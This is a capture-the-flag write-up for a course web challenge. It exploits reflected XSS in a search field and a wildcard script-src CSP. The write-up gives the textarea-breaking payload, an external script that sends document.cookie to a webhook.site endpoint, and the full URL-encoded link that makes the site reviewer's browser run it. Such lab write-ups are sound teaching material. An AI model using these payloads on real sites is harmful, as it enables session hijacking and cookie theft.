# Challenge `Read my lips: No more scripts!` writeup

- **Vulnerability:** XSS and misconfigured CSP
- **Where:** in search and feedback
- **Impact:** Allows execution of arbitrary script in site owner's browser

## Steps to reproduce

1. Create a request bin in **webhook.site**
1. Create a script that requests the created endpoint and sends the user cookie as a query parameter:
   `</textarea><script src="http://193.136.128.103:8000/exploit.js" > </script> <textarea>`.
   Were source is serving a static javascript file with: `window.open("https://webhook.site/3cf170ec-fafe-4c0a-83be-50f34d4429f9?q="+document.cookie);`.
   This script leverages the use of external scripts that are not being block by the CSP in place since `CSP: scrip-src *`, wildcard meaning every source and the injection of the submitted text into client's HTML code which allows closing the \<textarea\>
1. Insert into feedback URL bar after URL encoding `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252/?search=%3C%2Ftextarea%3E%3Cscript%20src%3D%22http%3A%2F%2F193.136.128.103%3A8000%2Fexploit.js%22%20%3E%20%3C%2Fscript%3E%20%3Ctextarea%3E` for the reviewer to access a page with a malicious search query. The description does not matter.
1. Submit feedback and get the flag from webhook website.
